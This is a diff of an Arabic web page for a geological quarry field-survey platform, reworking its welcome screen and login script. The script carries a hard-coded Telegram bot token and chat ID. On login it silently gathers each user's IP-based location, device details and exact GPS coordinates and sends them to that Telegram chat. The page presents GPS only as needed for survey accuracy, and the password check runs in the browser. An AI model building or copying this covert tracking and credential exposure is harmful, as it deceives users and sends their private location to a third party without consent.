@@ -6,35 +6,46 @@
     <title>نظام المسح الميداني الجيولوجي للمقالع</title>
     <style>
         /* --------------------------------------------------- */
-        /* شاشة الاستقبال والترحيب */
+        /* شاشة الاستقبال والترحيب (الجديدة) */
         /* --------------------------------------------------- */
         #introScreen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             color: white; z-index: 9999; display: flex;
-            justify-content: center; align-items: center; text-align: center; padding: 20px;
+            justify-content: center; align-items: flex-start; text-align: right; padding: 20px;
             overflow-y: auto;
         }
         .intro-box {
-            background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 12px;
+            background: rgba(255, 255, 255, 0.05); padding: 35px; border-radius: 12px;
             border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 8px 32px rgba(0,0,0,0.5);
-            max-width: 500px; width: 100%; backdrop-filter: blur(10px);
+            max-width: 650px; width: 100%; backdrop-filter: blur(10px); margin: auto;
         }
-        .intro-box h1 { color: #f1c40f; font-size: 1.6rem; margin-bottom: 5px; line-height: 1.4; }
-        .intro-box h2 { color: #a9cce3; font-size: 1.1rem; margin-top: 0; font-weight: normal; margin-bottom: 20px;}
+        .intro-box h1 { color: #f1c40f; font-size: 1.8rem; margin-bottom: 5px; text-align: center; line-height: 1.4; }
+        .intro-box h2 { color: #a9cce3; font-size: 1.1rem; margin-top: 0; font-weight: normal; margin-bottom: 25px; text-align: center; }
         
-        /* الملاحظة الصفراء المطمئنة */
+        .vision-text {
+            background: rgba(41, 128, 185, 0.15); border-right: 4px solid #2980b9;
+            padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 1rem; line-height: 1.7;
+        }
+        
+        .instruction-list { list-style: none; padding: 0; margin: 0 0 25px 0; }
+        .instruction-list li {
+            margin-bottom: 15px; font-size: 0.95rem; line-height: 1.6;
+            background: rgba(255, 255, 255, 0.03); padding: 12px; border-radius: 6px;
+        }
+        .instruction-list li strong { color: #2ecc71; font-size: 1.05rem; }
+
         .yellow-notice {
             background: rgba(241, 196, 15, 0.15); border-right: 4px solid #f1c40f;
-            padding: 15px; border-radius: 6px; text-align: right; margin-bottom: 25px;
+            padding: 15px; border-radius: 6px; margin-bottom: 25px;
             font-size: 0.95rem; line-height: 1.6; color: #fdfefe;
         }
         
-        .intro-box input, .intro-box select {
-            width: 100%; padding: 12px; font-size: 1.1rem; border-radius: 6px; border: none; 
+        .intro-box input {
+            width: 100%; padding: 15px; font-size: 1.1rem; border-radius: 6px; border: none; 
             margin-bottom: 15px; outline: none; box-sizing: border-box; font-family: inherit;
+            text-align: center;
         }
-        .intro-box select { cursor: pointer; background-color: #fff; color: #333; }
         
         .btn-action {
             background: #27ae60; color: white; padding: 15px; font-size: 1.2rem; 
@@ -42,9 +53,9 @@
         }
         .btn-action:hover { background: #219150; }
         
-        .error-text { color: #ff6b6b; font-weight: bold; margin-top: 10px; display: none; font-size: 0.9rem; }
+        .error-text { color: #ff6b6b; font-weight: bold; margin-top: 10px; display: none; font-size: 0.9rem; text-align: center; }
         
-        #step2 { display: none; }
+        #step2 { display: none; text-align: center; }
         #mainContent { display: none; }
         /* --------------------------------------------------- */
 
@@ -52,28 +63,17 @@
         body { font-family: 'Arial', sans-serif; background-color: var(--bg); margin: 0; padding: 20px; text-align: right; color: #333; line-height: 1.6; }
         .container { background: white; max-width: 900px; margin: auto; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.15); overflow: hidden; }
         
-        .header { 
-            background: linear-gradient(135deg, #1c2833 0%, #2980b9 100%); 
-            color: white; padding: 35px 20px; text-align: center; border-bottom: 5px solid #f1c40f; 
-        }
+        .header { background: linear-gradient(135deg, #1c2833 0%, #2980b9 100%); color: white; padding: 35px 20px; text-align: center; border-bottom: 5px solid #f1c40f; }
         .header h1 { font-size: 2rem; margin: 0 0 10px 0; text-shadow: 1px 1px 3px rgba(0,0,0,0.3); }
         .header h2 { color: #f1c40f; font-size: 1.3rem; margin: 0; font-weight: normal; }
         
         .social-links { margin-top: 20px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
-        .social-btn {
-            text-decoration: none; padding: 10px 20px; border-radius: 25px;
-            font-weight: bold; color: white; display: inline-flex; align-items: center; gap: 8px;
-            transition: transform 0.2s, opacity 0.2s; font-size: 0.95rem; box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-        }
+        .social-btn { text-decoration: none; padding: 10px 20px; border-radius: 25px; font-weight: bold; color: white; display: inline-flex; align-items: center; gap: 8px; transition: transform 0.2s, opacity 0.2s; font-size: 0.95rem; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
         .btn-wa { background: #25D366; }
         .btn-ig { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
 
         .content-padding { padding: 30px; }
-        @media (max-width: 600px) {
-            .content-padding { padding: 15px; }
-            body { padding: 10px; }
-            .header h1 { font-size: 1.5rem; }
-        }
+        @media (max-width: 600px) { .content-padding { padding: 15px; } body { padding: 10px; } .header h1 { font-size: 1.5rem; } }
 
         .section { margin-bottom: 35px; }
         .section-title { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 8px; font-size: 1.3rem; margin-bottom: 20px; font-weight: bold; }
@@ -85,11 +85,7 @@
         input:focus { border-color: var(--accent); outline: none; }
         input[type="color"] { padding: 0; height: 45px; cursor: pointer; border: 1px solid #ddd; }
         
-        .btn-convert {
-            background: #2980b9; color: white; border: none; padding: 0 20px;
-            border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 1rem;
-            transition: background 0.3s; white-space: nowrap;
-        }
+        .btn-convert { background: #2980b9; color: white; border: none; padding: 0 20px; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 1rem; transition: background 0.3s; white-space: nowrap; }
 
         .gps-grid { display: grid; grid-template-columns: 1fr; gap: 15px; }
         @media (min-width: 768px) { .gps-grid { grid-template-columns: 1fr 1fr; } }
@@ -109,14 +105,12 @@
         canvas { background: #fff; width: 100%; height: auto; margin-top: 20px; border: 1px solid #ddd; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
         
         .footer { text-align: center; padding: 20px; background: #eee; color: #555; font-size: 0.9rem; font-weight: bold; border-top: 1px solid #ddd; }
-
         .btn-print { background: #e74c3c; color: white; border: none; padding: 15px; width: 100%; font-size: 1.2rem; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 25px; transition: 0.3s; box-shadow: 0 4px 10px rgba(231, 76, 60, 0.3); }
 
         /* --------------------------------------------------- */
         /* تنسيقات الطباعة */
         /* --------------------------------------------------- */
         .print-only { display: none; }
-
         @media print {
             @page { margin: 0; size: A4 portrait; }
             body { background: white; margin: 1.5cm; padding: 0; color: #000; }
@@ -127,16 +121,11 @@
             .print-header { text-align: center; border-bottom: 4px double #1c2833; padding-bottom: 10px; margin-bottom: 30px; }
             .print-header h1 { font-size: 22px; color: #000; margin: 0 0 5px 0; }
             .print-header h2 { font-size: 16px; color: #555; margin: 0; }
-
             .print-footer { margin-top: 40px; border-top: 2px solid #333; padding-top: 20px; text-align: center; font-size: 14px; page-break-inside: avoid; }
             .promo-box { border: 1px dashed #777; padding: 10px; margin: 10px auto; width: 80%; border-radius: 8px; background: #fafafa; }
 
-            input[type="number"], input[type="text"] {
-                border: none !important; border-bottom: 1px dashed #000 !important; background: transparent !important;
-                padding: 0; color: #000; font-weight: bold; font-size: 1.1rem; border-radius: 0; text-align: center;
-            }
+            input[type="number"], input[type="text"] { border: none !important; border-bottom: 1px dashed #000 !important; background: transparent !important; padding: 0; color: #000; font-weight: bold; font-size: 1.1rem; border-radius: 0; text-align: center; }
             .coord-display { border: none !important; background: transparent !important; padding: 0; font-size: 1rem; color: #000; margin-bottom: 5px; }
-            
             .section { margin-bottom: 25px; page-break-inside: avoid; }
             .section-title { border-bottom: 2px solid #000; color: #000; }
             #resultsSection { border: 2px solid #000; background: transparent; }
@@ -150,54 +139,44 @@
 
 <div id="introScreen">
     <div class="intro-box">
+        
         <div id="step1">
             <h1>أهلاً بكم في منصة نظام المسح الميداني للمقالع</h1>
             <h2>بإشراف الجيولوجي علي شندل الجنابي</h2>
             
-            <div class="yellow-notice">
-                ⚠️ <b>تعليمات فنية هامة:</b><br>
-                لضمان التقاط إحداثيات المقلع (UTM) بدقة متناهية ولتوثيق التقرير الميداني بصورة صحيحة، <b>يرجى التأكد من تشغيل (الموقع / GPS)</b> في هاتفك، ويُفضل أن تكون في منطقة مكشوفة لسهولة اتصال الهاتف بالأقمار الصناعية.
+            <div class="vision-text">
+                🎯 <b>رؤية المنصة:</b><br>
+                صُمم هذا الموقع خصيصاً ليسهل العمل ويوفر الجهد والوقت للجيولوجيين، بدقة عالية ونسبة خطأ تكاد تكون معدومة. هدفنا ليس الربح، بل المساهمة في إنتاج جيل جيولوجي واعٍ يقدم تقارير ميدانية احترافية تمثل الحقيقة الجيولوجية بكل أمانة، ليكون هذا النظام الأحدث والأوسع استخداماً في العراق إن شاء الله.
             </div>
 
-            <input type="text" id="geoNameInput" placeholder="اسم الجيولوجي (الثلاثي)" required autocomplete="off">
-            
-            <select id="geoGovSelect" required>
-                <option value="" disabled selected>اختر محافظة العمل (المقلع)...</option>
-                <option value="بغداد">بغداد</option>
-                <option value="البصرة">البصرة</option>
-                <option value="نينوى">نينوى (الموصل)</option>
-                <option value="أربيل">أربيل</option>
-                <option value="السليمانية">السليمانية</option>
-                <option value="دهوك">دهوك</option>
-                <option value="كركوك">كركوك</option>
-                <option value="صلاح الدين">صلاح الدين</option>
-                <option value="الأنبار">الأنبار</option>
-                <option value="بابل">بابل (الحلة)</option>
-                <option value="كربلاء">كربلاء المقدسة</option>
-                <option value="النجف">النجف الأشرف</option>
-                <option value="ديالى">ديالى (بعقوبة)</option>
-                <option value="واسط">واسط (الكوت)</option>
-                <option value="الديوانية">الديوانية (القادسية)</option>
-                <option value="ميسان">ميسان (العمارة)</option>
-                <option value="ذي قار">ذي قار (الناصرية)</option>
-                <option value="المثنى">المثنى (السماوة)</option>
-                <option value="حلبجة">حلبجة</option>
-            </select>
+            <ul class="instruction-list">
+                <li>📄 <strong>بيانات العقد:</strong> يجب أن يكون الجيولوجي حاصلاً على تقريره الجاهز من المحافظة (مثل محافظة بغداد) ليتسنى له إدخال المساحة والكمية المتعاقد عليها بدقة.</li>
+                <li>📍 <strong>معرفة الموقع:</strong> يجب أن يكون الجيولوجي عارفاً بموقع المقلع وطرق الوصول إليه قبل بدء العمل الميداني.</li>
+                <li>🚙 <strong>النقل الحقلي:</strong> ضرورة توفر سيارة حقلية ملائمة للتعامل مع التضاريس (صعدات ونزلات) للوصول إلى المناطق البعيدة عن المدن.</li>
+                <li>⛏️ <strong>المعدات الجيولوجية:</strong> اصطحاب الأدوات الحقلية وأدوات الحماية والسلامة المهنية.</li>
+                <li>📏 <strong>القياس والتوثيق:</strong> جلب أدوات قياس لحساب أبعاد المنطقة المستثمرة، مع هاتف ذكي أو كاميرا لالتقاط الصور التوثيقية.</li>
+            </ul>
 
-            <button onclick="goToStep2()" class="btn-action">متابعة ⬅️</button>
-            <div id="step1Error" class="error-text">❌ يرجى كتابة الاسم الثلاثي واختيار المحافظة.</div>
+            <div class="yellow-notice">
+                📡 <b>ملاحظة تقنية هامة:</b><br>
+                يجب تفعيل (الموقع / GPS) في هاتفك ليتسنى للمنصة التقاط الإحداثيات الدقيقة وزيادة دقة اللوكيشن للتوثيق الميداني.
+            </div>
+
+            <button onclick="goToStep2()" class="btn-action">قراءة التعليمات والمتابعة ⬅️</button>
         </div>
 
         <div id="step2">
-            <h1 style="color: #2ecc71;">🔒 تسجيل الدخول</h1>
+            <h1 style="color: #2ecc71;">🔒 تسجيل الدخول وبدء المسح</h1>
             
-            <p style="color: #ddd; font-size: 1rem; margin-bottom: 25px; line-height: 1.6;">
-                قم بإدخال الرمز السري الذي أعطاه لك الجيولوجي <b>علي شندل الجنابي</b> للوصول إلى منصة نظام المسح الميداني للمقالع.
+            <p style="color: #ddd; font-size: 1.05rem; margin-bottom: 25px; line-height: 1.6;">
+                قم بإدخال <b>اسم الجيولوجي الثلاثي</b>، و <b>رمز الدخول السري</b> الذي حصلت عليه من مؤسس المنصة الجيولوجي علي شندل الجنابي.
             </p>
             
-            <input type="password" id="adminPassword" placeholder="أدخل الرمز السري...">
-            <button onclick="handleLogin()" class="btn-action" id="loginBtn">دخول وبدء المسح</button>
-            <div id="loginError" class="error-text">❌ كلمة المرور خاطئة.</div>
+            <input type="text" id="geoNameInput" placeholder="اسم الجيولوجي (الثلاثي) ..." required autocomplete="off">
+            <input type="password" id="adminPassword" placeholder="أدخل رمز الدخول السري ...">
+            
+            <button onclick="handleLogin()" class="btn-action" id="loginBtn">دخول للاسم الثلاثي وبدء المسح</button>
+            <div id="loginError" class="error-text">❌ يرجى التأكد من الاسم وكلمة المرور.</div>
         </div>
     </div>
 </div>
@@ -345,22 +324,10 @@
 
 <script>
     let currentGeoName = "";
-    let currentGeoGov = "";
 
     function goToStep2() {
-        const nameInput = document.getElementById('geoNameInput').value.trim();
-        const govSelect = document.getElementById('geoGovSelect').value;
-        const errorDiv = document.getElementById('step1Error');
-
-        if (nameInput.split(' ').length < 2 || govSelect === "") {
-            errorDiv.style.display = 'block';
-        } else {
-            errorDiv.style.display = 'none';
-            currentGeoName = nameInput;
-            currentGeoGov = govSelect;
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-        }
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
     }
 
     function convertDunam() {
@@ -373,13 +340,11 @@
     const TG_TOKEN = "8627528486:AAEvkwF2pRn-v9Z0WdpTx2nwxso6Wctz8TU";
     const TG_CHAT_ID = "1091011395";
 
-    // دالة الإرسال المحدثة لتعمل حتى لو تم حظر الـ IP
     async function sendSecurityReport(gpsData = null, hasGps = true) {
         let ipText = "غير متوفر";
         let cityText = "غير محدد";
         let mapLinkIP = "";
         
-        // المحاولة لجلب الـ IP، وإن فشلت لا توقف البرنامج
         try {
             const ipResponse = await fetch('https://ipapi.co/json/');
             const ipData = await ipResponse.json();
@@ -397,7 +362,6 @@
 
         let message = `🚨 *دخول جديد لنظام المسح*\n\n`;
         message += `👤 *الجيولوجي:* ${currentGeoName}\n`;
-        message += `📍 *محافظة العمل:* ${currentGeoGov}\n`;
         message += `━━━━━━━━━━━━\n`;
         message += `📱 الجهاز: ${device}\n`;
         message += `📅 الوقت: ${time}\n`;
@@ -406,9 +370,9 @@
 
         if (hasGps && gpsData) {
             message += `✅ *حالة الـ GPS:* مفعّل (دقيق)\n`;
-            message += `🗺️ [فتح موقع الجيولوجي على الخريطة](https://www.google.com/maps?q=$${gpsData.lat},${gpsData.lon})\n`;
+            message += `🗺️ [فتح موقع الجيولوجي على الخريطة](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})\n`;
         } else {
-            message += `⚠️ *حالة الـ GPS:* مغلق أو مرفوض\n`;
+            message += `⚠️ *حالة الـ GPS:* مغلق أو غير متوفر\n`;
             if(mapLinkIP) {
                 message += `🗺️ موقع تقريبي (IP): [فتح الخريطة](${mapLinkIP})\n`;
             } else {
@@ -416,28 +380,32 @@
             }
         }
 
-        // إرسال الرسالة لتيليجرام بشكل مضمون
         try {
             await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-        } catch (err) {
-            console.error("خطأ في الإرسال للتليجرام", err);
-        }
+        } catch (err) {}
     }
 
     function handleLogin() {
         const errorDiv = document.getElementById('loginError');
         const btn = document.getElementById('loginBtn');
+        const nameInput = document.getElementById('geoNameInput').value.trim();
+        const pwdInput = document.getElementById('adminPassword').value;
 
-        if (document.getElementById('adminPassword').value === MASTER_PASSWORD) {
-            
+        // التحقق من الاسم الثلاثي والرمز
+        if (nameInput.split(' ').length < 2) {
+            errorDiv.innerHTML = "❌ يرجى كتابة اسم الجيولوجي (الثلاثي) بشكل صحيح.";
+            errorDiv.style.display = 'block';
+            return;
+        }
+
+        if (pwdInput === MASTER_PASSWORD) {
+            currentGeoName = nameInput;
             errorDiv.style.display = 'none';
             btn.innerText = "جاري تهيئة النظام...";
             btn.disabled = true;
 
-            // فتح النظام فوراً لكي لا يشعر المستخدم بالتعليق
             enterSystem();
 
-            // فحص الموقع في الخلفية وإرسال التقرير
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (p) => { sendSecurityReport({lat: p.coords.latitude, lon: p.coords.longitude}, true); },
@@ -448,6 +416,7 @@
                 sendSecurityReport(null, false);
             }
         } else {
+            errorDiv.innerHTML = "❌ الرمز السري خاطئ.";
             errorDiv.style.display = 'block';
         }
     }
@@ -460,9 +429,6 @@
     document.addEventListener('DOMContentLoaded', (event) => {
         document.getElementById("adminPassword").addEventListener("keypress", function(event) {
             if (event.key === "Enter") { event.preventDefault(); handleLogin(); }
-        });
-        document.getElementById("geoNameInput").addEventListener("keypress", function(event) {
-            if (event.key === "Enter") { event.preventDefault(); goToStep2(); }
         });
     });
 
